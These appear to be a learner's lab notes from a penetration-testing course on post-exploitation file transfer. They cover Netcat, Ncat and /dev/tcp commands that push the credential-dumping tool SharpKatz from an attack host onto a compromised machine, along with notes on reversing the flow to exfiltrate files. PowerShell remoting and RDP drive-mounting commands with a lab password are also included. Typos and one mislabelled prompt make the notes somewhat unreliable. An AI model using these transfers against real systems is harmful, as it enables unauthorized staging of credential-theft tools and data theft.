this section covers a few alternative methods such as Netcat, Ncat, RDP, and powershell

### Netcat
original was created yn 1995 by Hobbit but hasn't been maintained. Nmap project created Ncat, a modern reimplementation that supports, SSL, IPv6, SOCKS and HTTP proxies, connection brokering and more

##### NetCat - Compromised Machine - Listening on Port 8000
```
### example using original netcat
victim@target$ nc -l -p 8000 > SharpKatz.exe
```
##### Ncat - Compromised Machine - Listening on Port 8000
```
### examplu using Ncat
victim@target$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
##### Netcat - attack Host - Sending File to compromised machine
```
### example using original Netcat
n00blyfe@htb nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```
`-q 0` closes the connection after the transfer is complete
##### Ncat - Attack Host - Sending File to Compromised machine
```
### example using Ncat
n00blyfe@htb$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

if there is a firewall preventing inbound connections, flip it around and we can use port 443 see below
##### Attack Host - Sending File as Input to Netocat
```
### examplu using original NetCat
n00blyfe@htb$ sudo nc -l -p 443 -q 0 < SharpeKatz.exe
```
##### Compromised Machine Connect to Netcat to Receieve the File
```
### example using original netcat
n00blyfe@htb$ nc 192.168.49.128 443 > SharpKatz.exe
```

##### Attack Host - Sending File as input to Ncat
```
### example using Ncat
n00blyfe@htb$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

##### Compromised Machine connect to Ncat to Receieve the file
```
### example using Ncat
victim@target$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

if the compromised machine doesn't have Netcat or ncat we can use /dev/TCP/
after sending file as input from your attacking machine, from your compromised machine do the following

```
victim@target$ cat < /dev/tcp/192.168.49.128/443 > SharKatz.exe
```
Note: we can reverse all this to get files to our pwnbox as needed
### PowerShell Session File Transfer
if HTTP, HTTPS and SMB are unavailable we can use WinRM ie PowerShell Remoting
enabling powershell remoting creates an HTTP and HTTPS listener that run on TCP/5985 and TCP/5986 respectively
To create a Powershell remote session on a remote machine we need admin access, we need to be a member of` remote management users` group, or have explicit permissions fro powershell remoting in the session configuration. 
##### Create a PowerSell Remoting session
```
$S C:\htb> $Session = New-PSSession -ComputerName Target
```
##### Copy file from localhost to target
```
PS C:\htb> copy-item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
### RDP
if using RDP you can just copy and paste in and out of the rdp session. xfreerdp and rdesktop historically allow copy and post from the target machine, but that may not always work as expected. alternatively you can mount a local resource on the target rdp server. rdesktop or xfreerdp can be used to expose a local folder in the remote RDP sesison.
##### Mounting a Linux Folder Using Rdesktop
```
n00blyfe@htb$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
##### Mounting a Linux Folder Using xfreerdp
```
n00blyfe@htb$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

to access the directory we can connect to `\\tsclient\` allowing us to transfer files to and from the RDP session